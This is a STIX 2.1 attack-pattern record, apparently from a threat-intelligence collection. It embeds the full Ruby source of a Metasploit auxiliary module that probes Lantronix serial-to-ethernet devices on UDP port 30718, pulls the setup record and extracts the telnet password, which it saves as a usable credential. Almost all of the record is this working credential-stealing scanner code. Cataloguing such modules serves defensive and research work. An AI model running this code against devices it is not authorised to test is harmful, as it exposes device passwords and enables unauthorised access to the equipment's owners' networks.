{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a1869f40-2d5c-4ade-9641-4b33ff13caa7",
    "created": "2024-08-14T16:26:43.497647Z",
    "modified": "2024-08-14T16:26:43.497653Z",
    "name": "Lantronix Telnet Password Recovery",
    "description": " This module retrieves the setup record from Lantronix serial-to-ethernet devices via the config port (30718/udp, enabled by default) and extracts the telnet password. It has been tested successfully on a Lantronix Device Server with software version V5.8.0.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/telnet/lantronix_telnet_password.rb",
            "external_id": "lantronix_telnet_password.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Lantronix Telnet Password Recovery',\n      'Description' => %q{\n          This module retrieves the setup record from Lantronix serial-to-ethernet\n        devices via the config port (30718/udp, enabled by default) and extracts the\n        telnet password. It has been tested successfully on a Lantronix Device Server\n        with software version V5.8.0.1.\n      },\n      'Author'      => 'jgor',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::CHOST,\n        Opt::RPORT(30718),\n        OptBool.new('CHECK_TCP', [false , 'Check TCP instead of UDP', false])\n      ])\n  end\n\n  def run_host(ip)\n    setup_probe = \"\\x00\\x00\\x00\\xF8\"\n    password = nil\n\n    begin\n      sock_opts = {\n        'LocalHost' => datastore['CHOST'] || nil,\n        'PeerHost'  => ip,\n        'PeerPort'  => datastore['RPORT'],\n        'Context'   =>  {\n          'Msf' => framework,\n          'MsfExploit' => self\n        }\n      }\n      if datastore['CHECK_TCP']\n        vprint_good(\"Checking Lantronix TCP Socket #{datastore['RPORT']} on #{ip}\")\n        rem_sock = Rex::Socket::Tcp.create(sock_opts)\n      else\n        # Create an unbound UDP socket if no CHOST is specified, otherwise\n        # create a UDP socket bound to CHOST (in order to avail of pivoting)\n        vprint_good(\"Checking Lantronix UDP Socket #{datastore['RPORT']} on #{ip}\")\n        rem_sock = Rex::Socket::Udp.create(sock_opts)\n      end\n      rem_sock.put(setup_probe)\n      res = rem_sock.recvfrom(65535, 0.5) and res[1]\n\n      password = parse_reply(res)\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError\n      print_error(\"Connection error\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      rem_sock.close if rem_sock\n    end\n\n    if password\n      if password == \"\\x00\\x00\\x00\\x00\"\n        print_status(\"#{rhost} - Password isn't used, or secure\")\n      else\n        print_good(\"#{rhost} - Telnet password found: #{password.to_s}\")\n\n        service_data = {\n          address: ip,\n          port: 9999,\n          service_name: 'telnet',\n          protocol: 'tcp',\n          workspace_id: myworkspace_id\n        }\n\n        credential_data = {\n          module_fullname: self.fullname,\n          origin_type: :service,\n          private_data: password.to_s,\n          private_type: :password\n        }.merge(service_data)\n\n        credential_core = create_credential(credential_data)\n\n        login_data = {\n          core: credential_core,\n          last_attempted_at: DateTime.now,\n          status: Metasploit::Model::Login::Status::SUCCESSFUL\n        }.merge(service_data)\n\n        create_credential_login(login_data)\n      end\n    end\n  end\n\n  def parse_reply(pkt)\n    setup_record = pkt[0]\n\n    # If response is a setup record, extract password bytes 13-16\n    if setup_record[3] and setup_record[3].ord == 0xF9\n      return setup_record[12,4]\n    else\n      return nil\n    end\n  end\nend\n"
}